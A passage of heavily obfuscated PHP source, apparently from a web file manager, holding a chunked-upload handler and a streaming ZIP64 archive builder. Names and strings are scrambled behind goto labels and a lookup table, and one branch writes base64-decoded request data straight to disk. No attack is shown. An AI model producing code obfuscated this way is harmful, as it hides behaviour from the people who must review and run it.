$aÔÅ¦½“òê[$BëÇ¶šö­[1878]]; if (!$this->uploadFile && $aÔÅ¦½“òê[$BëÇ¶šö­[1184]] > 0) { show_json($this->errorInfo($aÔÅ¦½“òê[$BëÇ¶šö­[1184]]), !1); } } else { if (isset($in[$BëÇ¶šö­[383]])) { $this->uploadFile = isset($in[$BëÇ¶šö­[1879]]) ? $BëÇ¶šö­[1880] : $BëÇ¶šö­[1724]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto B¤§®œ£å; EŠó•º˜¼¥: $BëÇ¶šö­ =& $_SERVER[ì‹É]; global $in; $this->in =& $in; goto C•Õœ¬ùî„; B¤§®œ£å: $this->checkSize(); $this->tempPathInit(); goto c˜ë¤÷ˆŞŸ; c˜ë¤÷ˆŞŸ: } public function upload() { goto Fƒì´æğå™; aªùÆ§‘–: if ($fî¾£‹ÇÄß > 1 && $fÉìÆñö ó <= 0) { show_json($Dåã¾ËŠç’[1885], !1); } if ($fÉìÆñö ó > $f—ß”¼×ÅÍ) { $fî¾£‹ÇÄß = 1; } if ($fî¾£‹ÇÄß <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto dˆÖ§¤øÛ‹; eÖòÔ¢Ğ¶ˆ: $b™·õ½Â— = $this->moveUploadedFile($b›°±—ÊÙ); if ($f—ß”¼×ÅÍ > 0 && filesize($b™·õ½Â—) == 0) { $this->showJson($Dåã¾ËŠç’[1886], !1); } if (!$b™·õ½Â—) { $this->showJson(LNG($Dåã¾ËŠç’[1887]), !1); } goto b’öÈÒå©”; Fƒì´æğå™: $Dåã¾ËŠç’ =& $_SERVER[ì‹É]; $a±ãÉó¥­ = isset($this->in[$Dåã¾ËŠç’[1881]]) ? intval($this->in[$Dåã¾ËŠç’[1881]]) : 0; $fî¾£‹ÇÄß = isset($this->in[$Dåã¾ËŠç’[1882]]) ? intval($this->in[$Dåã¾ËŠç’[1882]]) : 1; goto Eİ£±´Š²ë; Fˆ®¿ˆÚ¹: $d‰ØëöÖ…â = $this->writeTo($b™·õ½Â—, $EÌëÜ ‘, $this->tempFile); $DÒæ·´ª”Ô = IO::hashSimple($b™·õ½Â—); $f—ß”¼×ÅÍ = IO::size($b™·õ½Â—); goto A©™Äã—Ó; A©™Äã—Ó: @unlink($b™·õ½Â—); if (!$d‰ØëöÖ…â) { $this->showJson($Dåã¾ËŠç’[1889] . $a±ãÉó¥­, !1); } $d¿¿„Êº¤’[$Dåã¾ËŠç’[1890]] = $fî¾£‹ÇÄß; goto C‘ÜÚñß±; C‘ÜÚñß±: $d¿¿„Êº¤’[$Dåã¾ËŠç’[1891]][$Dåã¾ËŠç’[1892] . $a±ãÉó¥­] = array($Dåã¾ËŠç’[1893] => $cÍØ°ÊÃò, $Dåã¾ËŠç’[1010] => $a±ãÉó¥­, $Dåã¾ËŠç’[78] => $f—ß”¼×ÅÍ, $Dåã¾ËŠç’[161] => $DÒæ·´ª”Ô); $this->statusSet($d¿¿„Êº¤’); if (count($d¿¿„Êº¤’[$Dåã¾ËŠç’[1891]]) != $d¿¿„Êº¤’[$Dåã¾ËŠç’[1890]]) { $this->showJson($Dåã¾ËŠç’[1894] . $a±ãÉó¥­, !0); } goto E„Î‡ÆŞ­; c¦Ÿ±¯–„: CacheLock::unlock($this->tempFile); return $this->tempFile; goto dë‘ñ†Ü²¨; b’öÈÒå©”: $cÍØ°ÊÃò = $a±ãÉó¥­ * $fÉìÆñö ó; $EÌëÜ ‘ = @fopen($this->tempFile, $Dåã¾ËŠç’[1888]); fseek($EÌëÜ ‘, $cÍØ°ÊÃò); goto Fˆ®¿ˆÚ¹; dˆÖ§¤øÛ‹: CacheLock::lock($this->tempFile, 20); $d¿¿„Êº¤’ = $this->statusGet(); $this->initFileTemp(); goto eÖòÔ¢Ğ¶ˆ; Eİ£±´Š²ë: $b›°±—ÊÙ = $this->tempFile . $Dåã¾ËŠç’[1883] . $a±ãÉó¥­; $f—ß”¼×ÅÍ = isset($this->in[$Dåã¾ËŠç’[512]]) ? intval($this->in[$Dåã¾ËŠç’[512]]) : 0; $fÉìÆñö ó = isset($this->in[$Dåã¾ËŠç’[1884]]) ? intval($this->in[$Dåã¾ËŠç’[1884]]) : 0; goto aªùÆ§‘–; E„Î‡ÆŞ­: ignore_timeout(); if (!$this->checkChunkHash($d¿¿„Êº¤’)) { $this->showJson($Dåã¾ËŠç’[1895], !1); } $this->statusSet(!1); goto c¦Ÿ±¯–„; dë‘ñ†Ü²¨: } private function checkSize() { $cÑÓôà÷Çº =& $_SERVER[ì‹É]; if (phpBuild64() || $this->in[$cÑÓôà÷Çº[78]] < PHP_INT_MAX) { return; } show_json(LNG($cÑÓôà÷Çº[1896]), !1); } private function showJson($D›Ğé…åŠ´, $b‹ùˆÏ¤£Œ) { CacheLock::unlock($this->tempFile); if (!$b‹ùˆÏ¤£Œ) { return show_json($D›Ğé…åŠ´, $b‹ùˆÏ¤£Œ); } show_json($D›Ğé…åŠ´, $b‹ùˆÏ¤£Œ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto bğÌ‹·Ò»; a…ù‚•Ôø÷: $this->tempFile = $FéÊœß•„£ . $aÖÀ³ñ™[1899] . md5($DºØÌÒ¡¤ë . $this->in[$aÖÀ³ñ™[1441]]); goto D‰‚ë†Í£; bğÌ‹·Ò»: $aÖÀ³ñ™ =& $_SERVER[ì‹É]; $FéÊœß•„£ = TEMP_FILES; @mk_dir($FéÊœß•„£); goto fÅÂÍ±¹Ğç; fÅÂÍ±¹Ğç: touch($FéÊœß•„£ . $aÖÀ³ñ™[1897]); $DºØÌÒ¡¤ë = isset($this->in[$aÖÀ³ñ™[1898]]) ? $this->in[$aÖÀ³ñ™[1898]] : !1; if (strlen($DºØÌÒ¡¤ë) < 30) { $DºØÌÒ¡¤ë = md5(USER_ID . $this->in[$aÖÀ³ñ™[76]] . $this->fileName . $this->in[$aÖÀ³ñ™[78]]); } goto a…ù‚•Ôø÷; D‰‚ë†Í£: } private function moveUploadedFile($c×´ÃÔ¾ÌÔ) { $FÑÚìî×È™ =& $_SERVER[ì‹É]; $dá³ÙÚ·”Ë = $this->uploadFile; if ($dá³ÙÚ·”Ë == $FÑÚìî×È™[1900]) { @file_put_contents($c×´ÃÔ¾ÌÔ, base64_decode($_REQUEST[$FÑÚìî×È™[1901]])); } else { if ($dá³ÙÚ·”Ë == $FÑÚìî×È™[1724]) { $dÁØòù®Ñ = @fopen($c×´ÃÔ¾ÌÔ, $FÑÚìî×È™[1431]); $this->writeTo($dá³ÙÚ·”Ë, $dÁØòù®Ñ, $c×´ÃÔ¾ÌÔ); } else { if (!move_uploaded_file($dá³ÙÚ·”Ë, $c×´ÃÔ¾ÌÔ)) { return !1; } } } return $c×´ÃÔ¾ÌÔ; } private function writeTo($aÅš¬­—¤Ô, $eĞ­ö­œÕÉ, $B¼”®óÜÂ) { goto EŠåÇ½»‹; EŠåÇ½»‹: $Bó¤ö¨‘Äù =& $_SERVER[ì‹É]; $bõè°ß›é˜ = $Bó¤ö¨‘Äù[1902] . $B¼”®óÜÂ; $FŒ‡«¨„İ’ = CacheLock::lock($bõè°ß›é˜, 1); goto c¬±óñªê§; c¬±óñªê§: $aï´¦„÷ƒ¢ = @fopen($aÅš¬­—¤Ô, $Bó¤ö¨‘Äù[1430]); if (!$aï´¦„÷ƒ¢ || !$eĞ­ö­œÕÉ || !$FŒ‡«¨„İ’) { CacheLock::unlock($bõè°ß›é˜); return !1; } while (!feof($aï´¦„÷ƒ¢)) { fwrite($eĞ­ö­œÕÉ, fread($aï´¦„÷ƒ¢, 1024 * 200)); } goto c‡ê†åÃíÊ; c‡ê†åÃíÊ: fclose($aï´¦„÷ƒ¢); fclose($eĞ­ö­œÕÉ); CacheLock::unlock($bõè°ß›é˜); goto D½¹½±×°†; D½¹½±×°†: return !0; goto fã„°ˆÙÚ; fã„°ˆÙÚ: } private function statusGet() { goto c˜¿Šé˜Ñê; c˜¿Šé˜Ñê: $B ±À¢¢Œ =& $_SERVER[ì‹É]; if (is_array($this->statusData)) { return $this->statusData; } $dë“„òƒøË = $this->tempFile . $B ±À¢¢Œ[1903]; goto FÉ§äääØ; FÉ§äääØ: $BàÒÎµ…Œè = !1; if (file_exists($dë“„òƒøË)) { $BàÒÎµ…Œè = @file_get_contents($dë“„òƒøË); } if ($BàÒÎµ…Œè) { $this->statusData = unserialize($BàÒÎµ…Œè); } goto FäÉÅÚ‡£; FäÉÅÚ‡£: if (!$this->statusData) { $e²”Ü–‚œÆ = array($B ±À¢¢Œ[28] => $this->fileName, $B ±À¢¢Œ[1890] => 0, $B ±À¢¢Œ[1891] => array()); $this->statusSet($e²”Ü–‚œÆ); } return $this->statusData; goto BÊµ´¦‘ˆ; BÊµ´¦‘ˆ: } public function statusSet($dÀ“İƒ‰“) { $eùŸ•‘ùËã = $this->tempFile . $_SERVER[ì‹É][1903]; if (!$dÀ“İƒ‰“) { if (file_exists($eùŸ•‘ùËã)) { @unlink($eùŸ•‘ùËã); } return !0; } $this->statusData = $dÀ“İƒ‰“; return file_put_contents($eùŸ•‘ùËã, serialize($dÀ“İƒ‰“)); } private function initFileTemp() { $FÅò±Âœ– =& $_SERVER[ì‹É]; if (file_exists($this->tempFile)) { return; } $Aêä—»Î©î = fopen($this->tempFile, $FÅò±Âœ–[1904]); fseek($Aêä—»Î©î, $this->in[$FÅò±Âœ–[78]] - 1, SEEK_SET); fwrite($Aêä—»Î©î, $FÅò±Âœ–[464]); fclose($Aêä—»Î©î); } public function checkChunk() { goto CÖÑ•öÃğ; CÖÑ•öÃğ: $E•Ñ´”Œ†Ğ =& $_SERVER[ì‹É]; $EÕ—½Â‘¢ = array(); CacheLock::lock($this->tempFile); goto fñ¤í«…œ; c«à…ÒÈĞ…: return $EÕ—½Â‘¢; goto bÅ•¤îñ«; fñ¤í«…œ: $eßŸ„ëŠÊÙ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($eßŸ„ëŠÊÙ[$E•Ñ´”Œ†Ğ[1891]] as $D¢¹Ó¸Â‡) { $C¦È‹™ÉĞ = $D¢¹Ó¸Â‡[$E•Ñ´”Œ†Ğ[161]]; if ($C¦È‹™ÉĞ) { $EÕ—½Â‘¢[$E•Ñ´”Œ†Ğ[1905] . $D¢¹Ó¸Â‡[$E•Ñ´”Œ†Ğ[1010]]] = $C¦È‹™ÉĞ; } } goto c«à…ÒÈĞ…; bÅ•¤îñ«: } private function checkChunkHash($dªšğñ³ªˆ) { goto a‹Ú‘­Š; a‹Ú‘­Š: $EËùÏ±Ú =& $_SERVER[ì‹É]; if (count($dªšğñ³ªˆ[$EËùÏ±Ú[1891]]) != $dªšğñ³ªˆ[$EËùÏ±Ú[1890]]) { return !1; } $cØö×Ïƒœ = _get($this->in, $EËùÏ±Ú[1898]); goto eÑÊåš´„Ï; eÑÊåš´„Ï: $AŠ¡Ğ¦ê”Ï = _get($this->in, $EËùÏ±Ú[1906]); if (strlen($AŠ¡Ğ¦ê”Ï) == 32 && IO::hashSimple($this->tempFile) == $cØö×Ïƒœ && IO::hashMd5($this->tempFile) == $AŠ¡Ğ¦ê”Ï) { return !0; } $A¦Ë¶Ø—ñã = fopen($this->tempFile, $EËùÏ±Ú[1134]); goto D›«¤»¤‰Ø; b¸êºÑîõ: return $A²»ğšØ‘Ç; goto E‰‡˜Í‰Œ×; D›«¤»¤‰Ø: $A²»ğšØ‘Ç = !0; foreach ($dªšğñ³ªˆ[$EËùÏ±Ú[1891]] as $F›Â·µ¾ª) { fseek($A¦Ë¶Ø—ñã, $F›Â·µ¾ª[$EËùÏ±Ú[1893]]); $D†¯ñˆ©‡¹ = PathDriverStream::hash($A¦Ë¶Ø—ñã, $F›Â·µ¾ª[$EËùÏ±Ú[78]]); if ($F›Â·µ¾ª[$EËùÏ±Ú[161]] != $D†¯ñˆ©‡¹) { $A²»ğšØ‘Ç = !1; break; } } fclose($A¦Ë¶Ø—ñã); goto b¸êºÑîõ; E‰‡˜Í‰Œ×: } public static function fileName() { goto D»†°§Ï¿”; aÇ¤ˆ‘‚¡Š: $e‹¯ºÃ‚ = strtotime($in[$AÎ¼§Û„ë[1907]]); $e‹¯ºÃ‚ = $e‹¯ºÃ‚ ? $e‹¯ºÃ‚ : time(); $F®œÌÂ«ª = strtolower($fâ×ÕâĞÏ); goto bØ«¹§ïÑğ; bØ«¹§ïÑğ: if ($F®œÌÂ«ª == $AÎ¼§Û„ë[1908] || $F®œÌÂ«ª == $AÎ¼§Û„ë[1909]) { $fâ×ÕâĞÏ = date($AÎ¼§Û„ë[677], $e‹¯ºÃ‚) . $AÎ¼§Û„ë[71] . $in[$AÎ¼§Û„ë[78]] . $AÎ¼§Û„ë[1537]; } else { if ($F®œÌÂ«ª == $AÎ¼§Û„ë[1910]) { $fâ×ÕâĞÏ = date($AÎ¼§Û„ë[677], $e‹¯ºÃ‚) . $AÎ¼§Û„ë[71] . $in[$AÎ¼§Û„ë[78]] . $AÎ¼§Û„ë[1911]; } } return $fâ×ÕâĞÏ; goto Dùç½Àò·; CßŸšğ…: if (!empty($_FILES)) { $fâ×ÕâĞÏ = $fâ×ÕâĞÏ ? $fâ×ÕâĞÏ : $_FILES[$AÎ¼§Û„ë[164]][$AÎ¼§Û„ë[383]]; } $fâ×ÕâĞÏ = str_replace(array($AÎ¼§Û„ë[96], $AÎ¼§Û„ë[8]), array($AÎ¼§Û„ë[8], $AÎ¼§Û„ë[94]), trim($fâ×ÕâĞÏ)); if (!is_wap()) { return $fâ×ÕâĞÏ; } goto aÇ¤ˆ‘‚¡Š; D»†°§Ï¿”: $AÎ¼§Û„ë =& $_SERVER[ì‹É]; global $in; $fâ×ÕâĞÏ = isset($in[$AÎ¼§Û„ë[28]]) ? $in[$AÎ¼§Û„ë[28]] : $AÎ¼§Û„ë[33]; goto CßŸšğ…; Dùç½Àò·: } private function errorInfo($B® Î™îèÍ) { $Dƒá•´´• =& $_SERVER[ì‹É]; $a·Ü˜ìò†ù = array($Dƒá•´´•[1912], $Dƒá•´´•[1913], $Dƒá•´´•[1914], $Dƒá•´´•[1915], $Dƒá•´´•[1916], $Dƒá•´´•[1917], $Dƒá•´´•[1918], $Dƒá•´´•[1919]); return $B® Î™îèÍ . $Dƒá•´´•[4] . $a·Ü˜ìò†ù[$B® Î™îèÍ]; } } goto F´™ø‚ÓÓ ; F´™ø‚ÓÓ : class ZipMake { const VERSION = "\x30\56\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($cã¸‡ÜÏïÈ = null) { $F–Ù„ø¡¼ =& $_SERVER[ì‹É]; $this->outputStream = fopen($F–Ù„ø¡¼[1920], $F–Ù„ø¡¼[1190]); $this->outputName = $cã¸‡ÜÏïÈ; $this->needHeaders = !0; } public function addFile($f•ÏóŞ«Ü‰, $EŒå’ƒîì) { goto AëœöàñĞ; A¨Í‡Ïì›ò: while (!feof($d‡ˆºˆÏ‡»)) { $bË©è§÷µÏ = fread($d‡ˆºˆÏ‡», 1048576); $this->send($bË©è§÷µÏ); } fclose($d‡ˆºˆÏ‡»); $f‹õ‡»í¼ = hexdec(hash_file($b°äç§Æ¸Š[1922], $EŒå’ƒîì)); goto bô¼½¢Œê; AëœöàñĞ: $b°äç§Æ¸Š =& $_SERVER[ì‹É]; $f•ÏóŞ«Ü‰ = $this->filterFilename($f•ÏóŞ«Ü‰); $fÆ¥ ±ÑŒ = static::METHOD_STORE; goto e˜±Õášù„; bô¼½¢Œê: $this->addFileFooter($f•ÏóŞ«Ü‰, $fÆ¥ ±ÑŒ, $f‹õ‡»í¼, $B„™º†âĞ¥, $C‡¨–¸Úò², $f¼âåá¨ä ); goto cêáˆÒ±¡‡; e˜±Õášù„: $f¼âåá¨ä  = $this->addFileHeader($f•ÏóŞ«Ü‰, $fÆ¥ ±ÑŒ); $B„™º†âĞ¥ = $C‡¨–¸Úò² = filesize($EŒå’ƒîì); $d‡ˆºˆÏ‡» = fopen($EŒå’ƒîì, $b°äç§Æ¸Š[1921]); goto A¨Í‡Ïì›ò; cêáˆÒ±¡‡: } public function addFileFromStream($E‡»Û™×Ğ·, $EìÂøÒ“ĞÃ) { goto F¢ËÍ’Ìè“; dß››ìÎã—: $C–‰‡öïƒ = hash_init($_SERVER[ì‹É][1922]); while (!feof($EìÂøÒ“ĞÃ)) { $b¼‚ø²‰®— = fread($EìÂøÒ“ĞÃ, 1048576); hash_update($C–‰‡öïƒ, $b¼‚ø²‰®—); $this->send($b¼‚ø²‰®—); } $A©ÈÎÅ‰ ³ = hexdec(hash_final($C–‰‡öïƒ)); goto F’‚ĞÚå˜Š; F’‚ĞÚå˜Š: $this->addFileFooter($E‡»Û™×Ğ·, $A‘Ã¸´’‰ó, $A©ÈÎÅ‰ ³, $E¹¢ÚÕíïã, $eÁåØ×ß¨‚, $e‰ÏÊ”œîÏ); goto C„Õœ™æ‡; DÎÓ‡‰îä–: fseek($EìÂøÒ“ĞÃ, 0, SEEK_END); $E¹¢ÚÕíïã = $eÁåØ×ß¨‚ = ftell($EìÂøÒ“ĞÃ); rewind($EìÂøÒ“ĞÃ); goto dß››ìÎã—; F¢ËÍ’Ìè“: $E‡»Û™×Ğ· = $this->filterFilename($E‡»Û™×Ğ·); $A‘Ã¸´’‰ó = static::METHOD_STORE; $e‰ÏÊ”œîÏ = $this->addFileHeader($E‡»Û™×Ğ·, $A‘Ã¸´’‰ó); goto DÎÓ‡‰îä–; C„Õœ™æ‡: } public function finish() { foreach ($this->files as $B £®ÕÅÖ¦) { $this->addCdrFile($B £®ÕÅÖ¦); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($FÓêÅ†‰„, $bê…ÜŒø) { goto C‚ƒÒˆÇîñ; FÁÂšíˆ§: return strlen($Bß·â°êÃ) + $cƒ¾ÇÉÁ† + strlen($cïëƒ¸²ãÈ); goto BŞ†›Ñà¬; aíÃ…¬ŸÂ‚: $Bß·â°êÃ = $this->packFields($B‰ÛíÖÍ); $cïëƒ¸²ãÈ = $this->packFields($b©Œğ¡ò˜); $this->send($Bß·â°êÃ . $FÓêÅ†‰„ . $cïëƒ¸²ãÈ); goto FÁÂšíˆ§; C‚ƒÒˆÇîñ: $DµéÛ¨ŠâÖ =& $_SERVER[ì‹É]; $FÓêÅ†‰„ = preg_replace($DµéÛ¨ŠâÖ[1923], $DµéÛ¨ŠâÖ[33], $FÓêÅ†‰„); $cƒ¾ÇÉÁ† = strlen($FÓêÅ†‰„); goto cÜãõËä¸†; cÜãõËä¸†: $B‰Ïµ‘ßõ = $this->dosTime(time()); $B‰ÛíÖÍ = array(array($DµéÛ¨ŠâÖ[1924], static::FILE_HEADER_SIGNATURE), array($DµéÛ¨ŠâÖ[1925], static::ZIP_VERSION_64), array($DµéÛ¨ŠâÖ[1925], 8), array($DµéÛ¨ŠâÖ[1925], $bê…ÜŒø), array($DµéÛ¨ŠâÖ[1924], $B‰Ïµ‘ßõ), array($DµéÛ¨ŠâÖ[1924], 0), array($DµéÛ¨ŠâÖ[1924], 4294967295), array($DµéÛ¨ŠâÖ[1924], 4294967295), array($DµéÛ¨ŠâÖ[1925], $cƒ¾ÇÉÁ†), array($DµéÛ¨ŠâÖ[1925], 32)); $b©Œğ¡ò˜ = array(array($DµéÛ¨ŠâÖ[1925], 1), array($DµéÛ¨ŠâÖ[1925], 28), array($DµéÛ¨ŠâÖ[1926], 0), array($DµéÛ¨ŠâÖ[1926], 0), array($DµéÛ¨ŠâÖ[1926], 0), array($DµéÛ¨ŠâÖ[1924], 0)); goto aíÃ…¬ŸÂ‚; BŞ†›Ñà¬: } protected function addFileFooter($fê¥‹ë¿‚´, $dğˆª·Š¡÷, $f¶ª†‹¢èÏ, $E‰ì…¡š», $aõƒ§Ûæİ, $a–ñÒğ´¼) { $a©çÕ­§ =& $_SERVER[ì‹É]; $Fˆ÷‡‘´Áœ = array(array($a©çÕ­§[1924], static::DATA_DESCRIPTOR_SIGNATURE), array($a©çÕ­§[1924], $f¶ª†‹¢èÏ), array($a©çÕ­§[1926], $E‰ì…¡š»), array($a©çÕ­§[1926], $aõƒ§Ûæİ)); $bÜ¿ƒóà = $this->packFields($Fˆ÷‡‘´Áœ); $this->send($bÜ¿ƒóà); $BÁ™Ò‘– = $a–ñÒğ´¼ + $E‰ì…¡š» + $dõ¼ĞÓé¢‡; $this->addToCdr($fê¥‹ë¿‚´, $dğˆª·Š¡÷, $f¶ª†‹¢èÏ, $E‰ì…¡š», $aõƒ§Ûæİ, $BÁ™Ò‘–); } private function addToCdr($Eà²Õ‰ÂÑö, $eéæìî·ëƒ, $DãÔè××ï, $a‰–ë„§ÔÇ, $b‘â‚ÂÁ†, $E›Î·Ê°ä) { $this->files[] = array($Eà²Õ‰ÂÑö, $eéæìî·ëƒ, $DãÔè××ï, $a‰–ë„§ÔÇ, $b‘â‚ÂÁ†, $this->ofs); $this->ofs += $E›Î·Ê°ä; } protected function addCdrFile($e÷Ğµ’‚ƒ÷) { goto CÔâ…èŸ™¤; c£—†²ä‹³: $d¢ÕÔ«Û‚© = $this->packFields($e†Ò»‹¦‘á); $EØğçÏÀ»µ = $this->packFields($E‡éÃ‘ö); $c¨‹ƒ‰Úä = $d¢ÕÔ«Û‚© . $cÖÖ¡ì¹öÍ . $BäÎôé”óƒ . $EØğçÏÀ»µ; goto Eô¤ìçµ„Õ; CÔâ…èŸ™¤: $A…‰½ã§“ã =& $_SERVER[ì‹É]; list($cÖÖ¡ì¹öÍ, $Dñ…ÑÙÀÄï, $AÂæñèÓÏó, $bòÏìØ“ª³, $BÏë¶µÍ†, $dâØÑĞ•Ëì) = $e÷Ğµ’‚ƒ÷; $BäÎôé”óƒ = $A…‰½ã§“ã[33]; goto eµÇõ‹‚õŒ; Eô¤ìçµ„Õ: $this->send($c¨‹ƒ‰Úä); $this->cdr_ofs += strlen($c¨‹ƒ‰Úä); goto F­Ÿ†¡‹Ëµ; eµÇõ‹‚õŒ: $E÷Ì…˜ø = $this->dosTime(time()); $e†Ò»‹¦‘á = array(array($A…‰½ã§“ã[1924], static::CDR_FILE_SIGNATURE), array($A…‰½ã§“ã[1925], static::ZIP_VERSION_64), array($A…‰½ã§“ã[1925], static::ZIP_VERSION_64), array($A…‰½ã§“ã[1925], 8), array($A…‰½ã§“ã[1925], $Dñ…ÑÙÀÄï), array($A…‰½ã§“ã[1924], $E÷Ì…˜ø), array($A…‰½ã§“ã[1924], $AÂæñèÓÏó), array($A…‰½ã§“ã[1924], 4294967295), array($A…‰½ã§“ã[1924], 4294967295), array($A…‰½ã§“ã[1925], strlen($cÖÖ¡ì¹öÍ)), array($A…‰½ã§“ã[1925], 32), array($A…‰½ã§“ã[1925], strlen($BäÎôé”óƒ)), array($A…‰½ã§“ã[1925], 0), array($A…‰½ã§“ã[1925], 0), array($A…‰½ã§“ã[1924], 32), array($A…‰½ã§“ã[1924], 4294967295)); $E‡éÃ‘ö = array(array($A…‰½ã§“ã[1925], 1), array($A…‰½ã§“ã[1925], 28), array($A…‰½ã§“ã[1926], $BÏë¶µÍ†), array($A…‰½ã§“ã[1926], $bòÏìØ“ª³), array($A…‰½ã§“ã[1926], $dâØÑĞ•Ëì), array($A…‰½ã§“ã[1924], 0)); goto c£—†²ä‹³; F­Ÿ†¡‹Ëµ: } protected function addCdr64Eof() { goto FÇËœ‡ºö¯; FÇËœ‡ºö¯: $F‡Õ«×ÜĞ¨ =& $_SERVER[ì‹É]; $f“Ş®ˆÇâ· = count($this->files); $DÏ“É÷¹Ö‰ = $this->cdr_ofs; goto Eà’ù”÷‡; Eà’ù”÷‡: $c¥æ©’Ëäô = $this->ofs; $a‡ÃÎ”Á´¥ = array(array($F‡Õ«×ÜĞ¨[1924], static::ZIP64_CDR_EOF_SIGNATURE), array($F‡Õ«×ÜĞ¨[1926], 44), array($F‡Õ«×ÜĞ¨[1925], static::ZIP_VERSION_64), array($F‡Õ«×ÜĞ¨[1925], static::ZIP_VERSION_64), array($F‡Õ«×ÜĞ¨[1924], 0), array($F‡Õ«×ÜĞ¨[1924], 0), array($F‡Õ«×ÜĞ¨[1926], $f“Ş®ˆÇâ·), array($F‡Õ«×ÜĞ¨[1926], $f“Ş®ˆÇâ·), array($F‡Õ«×ÜĞ¨[1926], $DÏ“É÷¹Ö‰), array($F‡Õ«×ÜĞ¨[1926], $c¥æ©’Ëäô)); $aêãò‰›ƒµ = $this->packFields($a‡ÃÎ”Á´¥); goto fºáƒê¶³; fºáƒê¶³: $this->send($aêãò‰›ƒµ); goto dà±÷Õ÷„‡; dà±÷Õ÷„‡: } protected function addCdr64Locator() { goto CÆ×œ‰¦ê®; Fä‘ÅÉ‚áœ: $this->send($b·»¿ÂÍ¨ó); goto F¡ŠŒ·ÃÃ¨; CÆ×œ‰¦ê®: $d«¯…ÀÎµ =& $_SERVER[ì‹É]; $bøÖßë³ = count($this->files); $f²¢åáëåŠ = $this->cdr_ofs; goto F™–®ö°†; F™–®ö°†: $cë«ŸĞŞÙ = $this->ofs; $d¸’×„„ˆ« = array(array($d«¯…ÀÎµ[1924], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($d«¯…ÀÎµ[1924], 0), array($d«¯…ÀÎµ[1926], $cë«ŸĞŞÙ + $f²¢åáëåŠ), array($d«¯…ÀÎµ[1924], 1)); $b·»¿ÂÍ¨ó = $this->packFields($d¸’×„„ˆ«); goto Fä‘ÅÉ‚áœ; F¡ŠŒ·ÃÃ¨: } protected function addCdrEof() { goto dËùå©Ë; fÆ©Œ½‰öæ: $BÌ„Á®µÄ÷ = $this->ofs; $C‰–”¥§ãê = $F­²Ş•ÆÉõ[33]; $bàÎÃÎ½ µ = array(array($F­²Ş•ÆÉõ[1924], static::CDR_EOF_SIGNATURE), array($F­²Ş•ÆÉõ[1925], 0), array($F­²Ş•ÆÉõ[1925], 0), array($F­²Ş•ÆÉõ[1925], $B¤»ÇâÇ¡Ş), array($F­²Ş•ÆÉõ[1925], $B¤»ÇâÇ¡Ş), array($F­²Ş•ÆÉõ[1924], 4294967295), array($F­²Ş•ÆÉõ[1924], 4294967295), array($F­²Ş•ÆÉõ[1925], strlen($C‰–”¥§ãê))); goto c¨ÑØ×ÏçÑ; c¨ÑØ×ÏçÑ: $aîóæôå  = $this->packFields($bàÎÃÎ½ µ) . $C‰–”¥§ãê; $this->send($aîóæôå ); goto dÉÁ’®¯â; dËùå©Ë: $F­²Ş•ÆÉõ =& $_SERVER[ì‹É]; $B¤»ÇâÇ¡Ş = count($this->files); $a»®¼×ø¹ = $this->cdr_ofs; goto fÆ©Œ½‰öæ; dÉÁ’®¯â: } protected function addCdr() { foreach ($this->files as $bË¿®É£) { $this->addCdrFile($bË¿®É£); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $DÃõùö˜Ÿ =& $_SERVER[ì‹É]; $Cç”ƒ¹“ŒÏ = $DÃõùö˜Ÿ[199]; if ($this->outputName) { $dšŒÓ„Å° = trim(str_replace(array($DÃõùö˜Ÿ[114], $DÃõùö˜Ÿ[55], $DÃõùö˜Ÿ[96], $DÃõùö˜Ÿ[68], $DÃõùö˜Ÿ[214], $DÃõùö˜Ÿ[716]), $DÃõùö˜Ÿ[33], $this->outputName)); $Aƒ¡¢²óÏ× = rawurlencode($dšŒÓ„Å°); $Cç”ƒ¹“ŒÏ .= "\73\x20\x66\x69\154\145\x6e\141\x6d\145\x2a\75\x75\164\146\x2d\70\x27\x27{$Aƒ¡¢²óÏ×}"; } $a·ÀÔŠã˜¸ = array($DÃõùö˜Ÿ[196] => $DÃõùö˜Ÿ[1927], $DÃõùö˜Ÿ[1928] => $Cç”ƒ¹“ŒÏ, $DÃõùö˜Ÿ[1929] => $DÃõùö˜Ÿ[1930], $DÃõùö˜Ÿ[1931] => $DÃõùö˜Ÿ[1932], $DÃõùö˜Ÿ[1933] => $DÃõùö˜Ÿ[1934]); foreach ($a·ÀÔŠã˜¸ as $a‡©ãÄ¢ßŠ => $e¹ˆÂôİø) { header($a‡©ãÄ¢ßŠ . $DÃõùö˜Ÿ[877] . $e¹ˆÂôİø); } } protected function send($E¥¢šÈ®¨•) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $E¥¢šÈ®¨•); } protected final function dosTime($EÔ•Š•È) { $C¶ÁÕ›ã§í =& $_SERVER[ì‹É]; $AÀŒÌ¯·‡ = getdate($EÔ•Š•È); if ($AÀŒÌ¯·‡[$C¶ÁÕ›ã§í[1634]] < 1980) { $AÀŒÌ¯·‡ = array($C¶ÁÕ›ã§í[1634] => 1980, $C¶ÁÕ›ã§í[1935] => 1, $C¶ÁÕ›ã§í[1936] => 1, $C¶ÁÕ›ã§í[1937] => 0, $C¶ÁÕ›ã§í[1938] => 0, $C¶ÁÕ›ã§í[1939] => 0); } $AÀŒÌ¯·‡[$C¶ÁÕ›ã§í[1634]] -= 1980; return $AÀŒÌ¯·‡[$C¶ÁÕ›ã§í[1634]] << 25 | $AÀŒÌ¯·‡[$C¶ÁÕ›ã§í[1935]] << 21 | 